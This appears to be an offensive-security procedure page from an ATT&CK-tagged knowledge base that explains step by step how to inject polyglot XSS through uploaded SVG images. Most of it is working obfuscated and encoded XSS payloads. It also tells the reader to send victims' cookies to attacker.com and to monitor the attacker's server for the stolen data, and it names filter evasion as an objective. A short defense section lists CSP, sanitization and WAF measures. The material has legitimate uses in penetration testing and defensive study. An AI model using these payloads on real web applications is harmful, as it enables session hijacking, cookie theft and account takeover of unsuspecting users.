---
id: 0ca0ae5d-a1e2-4731-9348-ee8c86c05e8d
name: Polyglot-XSS-Attack-using-SVG-Image-Injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:42.289114+00:00'
updated_at: '2023-04-10T20:21:55.843753+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - '[[techniques/Scripting|T1064 - Scripting]]'
sub_techniques: []
tags:
  - '[[tags/Cross Site Scripting]]'
  - '[[tags/Polyglot XSS]]'
commands: []
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Polyglot-XSS-Attack-using-SVG-Image-Injection

## Summary

This procedure demonstrates how to craft and inject a polyglot XSS payload embedded within an SVG image file to bypass input validation and execute malicious JavaScript in a victim's browser. By leveraging SVG's ability to contain executable scripts, attackers can upload the image to a vulnerable web application, leading to code execution when the image is rendered, enabling data theft, session hijacking, or further exploitation.

## Description

Polyglot XSS attacks using SVG image injection exploit web applications that allow file uploads or image rendering without proper sanitization of SVG content. SVG files, being XML-based, can embed JavaScript that executes in the context of the rendering page. The polyglot nature ensures the payload works across multiple contexts (e.g., HTML attributes, script tags, event handlers) and bypasses common filters like WAFs or input sanitizers through obfuscation, encoding, and tag breaking. This technique targets public-facing applications vulnerable to reflected, stored, or DOM-based XSS. In a typical scenario, an attacker uploads the malicious SVG via a file upload feature or injects it into a user profile/image display area. When a victim views the page, the browser parses the SVG and triggers the embedded script, such as alerting for proof-of-concept or exfiltrating cookies to an attacker-controlled server. Prerequisites include a vulnerable endpoint that processes and displays SVG without stripping scripts. Expected outcomes include arbitrary JavaScript execution in the victim's session, potentially leading to account takeover or phishing escalation.

## Requirements

1. Access to a vulnerable web application with file upload or image rendering functionality that accepts SVG files.
2. Knowledge of the application's input handling to identify injection points (e.g., user avatars, comment images).
3. Tools for crafting and encoding payloads, such as a text editor or Burp Suite for testing.
4. A victim or test environment to verify execution without real harm.

## Defense

- Implement strict content security policies (CSP) to block inline scripts and restrict script sources to trusted domains.
- Sanitize and validate all uploaded files: reject SVGs or parse them to remove script elements using libraries like DOMPurify.
- Use secure file upload practices: store uploads outside the web root, serve with Content-Type image/svg+xml but scan for scripts.
- Deploy web application firewalls (WAFs) tuned to detect obfuscated JavaScript and SVG-based payloads.
- Regularly scan for vulnerabilities with tools like OWASP ZAP or Burp Suite, and keep applications patched.

## Objectives

1. Craft a polyglot XSS payload that embeds within an SVG structure to evade detection.
2. Inject the payload via file upload or input field to a vulnerable web application.
3. Achieve JavaScript execution in the victim's browser to demonstrate compromise, such as alerting or data exfiltration.
4. Validate success by observing payload execution without triggering defenses.

## Instructions

### Step 1: Identify Vulnerable Upload Endpoint

**Context**: Locate a feature in the target application that allows uploading or displaying images, particularly SVGs, without proper validation. Test for XSS by attempting to upload a simple script-embedded SVG.

Inspect the upload form using browser dev tools or a proxy like Burp Suite to understand request parameters and response handling.

### Step 2: Craft Malicious SVG with Polyglot Payload

**Context**: Embed one or more polyglot XSS payloads into an SVG file. Start with a basic SVG structure and insert obfuscated JavaScript in onload or onclick events to ensure execution on render.

Use [[codes/Polyglot-XSS-with-SVG-Onload]] for a versatile payload that breaks out of common contexts:

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Wrap it in a full SVG file, e.g., save as malicious.svg:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>/* Insert polyglot payload here */</script>
</svg>
```

Replace alert() with a real payload like document.location='http://attacker.com?cookie='+document.cookie for exfiltration.

**Expected Output**: A valid SVG file that renders as an image but executes JS when loaded.

### Step 3: Test Payload in Multiple Contexts

**Context**: Verify the polyglot nature by testing the payload in various injection points (e.g., attributes, tags) to ensure bypass of filters.

Inject [[codes/Multi-Context-Polyglot-XSS-Payload]] into an input field or URL parameter:

```javascript
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
```

Submit via the application's form and observe if it triggers in HTML, JS, or other parsers.

**Expected Output**: Alert or prompt box appears, confirming execution across contexts.

### Step 4: Upload and Trigger SVG Injection

**Context**: Upload the crafted SVG to the target application and induce a victim (or self) to view it, triggering the onload event.

Use [[codes/Encoded-SVG-Onload-XSS]] for an obfuscated variant to evade basic filters:

```javascript
<svg%0Ao%00nload=%09((pro\u006dpt))()//
```

Embed in SVG and upload. Navigate to the page displaying the image.

**Expected Output**: Browser executes the prompt or alert when the SVG loads.

### Step 5: Escalate with Comprehensive Polyglot

**Context**: For robust bypass, combine multiple payloads into one SVG to cover edge cases.

Incorporate [[codes/Comprehensive-Polyglot-XSS-Combination]]:

```javascript
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id=\"confirm&lpar;1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'"><img src=\"http://i.imgur.com/P8mL8.jpg\">\njavascript://'/</title></style></textarea></script>--><p\" onclick=alert()//>*/alert()/*\njavascript://--></script></title></style>\"/</textarea>*/<alert()/*' onclick=alert()//>a\njavascript://</title>\"/</script></style></textarea/--><alert()/*' onclick=alert()//>/\njavascript://</title></style></textarea>--></script><a\"//' onclick=alert()//>*/alert()/*\n--></script></title></style>\"/</textarea><a' onclick=alert()//>*/alert()/*\n/</title/'/</style/</script/</textarea/--><p\" onclick=alert()//>*/alert()/*\njavascript://--></title></style></textarea></script><svg \"'//' onclick=alert()//\n/</title/'/</style/</script/--><p\" onclick=alert()//>*/alert()/*
```

Test in the upload and confirm multi-context execution.

**Expected Output**: XSS triggers regardless of injection point or filter.

### Step 6: Verify and Exfiltrate

**Context**: Confirm success and replace alerts with exfiltration to capture data.

Use [[codes/SVG-XSS-with-Obfuscated-Onload]] for stealthy execution:

```javascript
-->'\"/"></sCript><svG x=\">\" onload=(co\u006efirm)``>
```

Monitor attacker server for stolen data.

**Expected Output**: Data sent to attacker endpoint, no visible alerts if obfuscated.
